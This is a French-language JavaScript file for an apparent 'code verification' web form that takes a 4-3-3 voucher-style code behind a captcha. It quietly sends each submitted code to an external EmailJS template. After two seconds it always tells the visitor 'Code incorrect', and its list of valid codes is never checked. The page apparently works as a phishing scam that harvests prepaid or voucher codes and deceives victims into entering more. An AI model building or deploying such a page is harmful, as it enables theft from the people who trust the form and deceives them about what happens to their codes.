console.log("Script chargé");

emailjs.init("OdVrpD_0CpgUT6Ahz");


const validCodes = [
    "AB12-7X9-Q8P",
    "VC45-A2B-123",
    "GH78-AAA-999",
    "TEST-123-ABC"
];


const part1 = document.getElementById("part1");
const part2 = document.getElementById("part2");
const part3 = document.getElementById("part3");

const result = document.getElementById("result");

const verificationForm = document.getElementById("verificationForm");

console.log("Formulaire :", verificationForm);


// Limitation format 4-3-3 + passage automatique
const inputs = [part1, part2, part3];
const maxLengths = [4, 3, 3];


inputs.forEach((input, index) => {

    input.addEventListener("input", function(){

        this.value = this.value
            .toUpperCase()
            .replace(/[^A-Z0-9]/g,"")
            .slice(0, maxLengths[index]);


        if(this.value.length === maxLengths[index] && index < inputs.length - 1){

            inputs[index + 1].focus();

        }

    });

});



// FORMULAIRE

verificationForm.addEventListener("submit", function(e){

    console.log("Formulaire détecté");

    e.preventDefault();


    const code = 
        part1.value + "-" +
        part2.value + "-" +
        part3.value;



    // Vérification format 4-3-3

    if(
        part1.value.length !== 4 ||
        part2.value.length !== 3 ||
        part3.value.length !== 3
    ){

        result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
        result.className = "error";
        return;

    }



    // Vérification captcha

    const captcha = grecaptcha.getResponse();


    if(captcha.length === 0){

        result.innerHTML = "Veuillez confirmer le captcha.";
        result.className = "error";
        return;

    }



    console.log("Code envoyé :", code);



    emailjs.send(
        "service_client",
        "template_j5sh9yy",
        {
            part1: part1.value,
            part2: part2.value,
            part3: part3.value,
            code_complet: code
        }
    )


    .then(function(){


        result.innerHTML = "✅ Votre demande est en cours de traitement.";
        result.className = "success";


        setTimeout(function(){

            result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
            result.className = "error";


        }, 2000);



        part1.value = "";
        part2.value = "";
        part3.value = "";


        grecaptcha.reset();

        part1.focus();


    })


    .catch(function(error){

        console.log(error);

        result.innerHTML = "Erreur lors de l'envoi.";
        result.className = "error";

    });


});
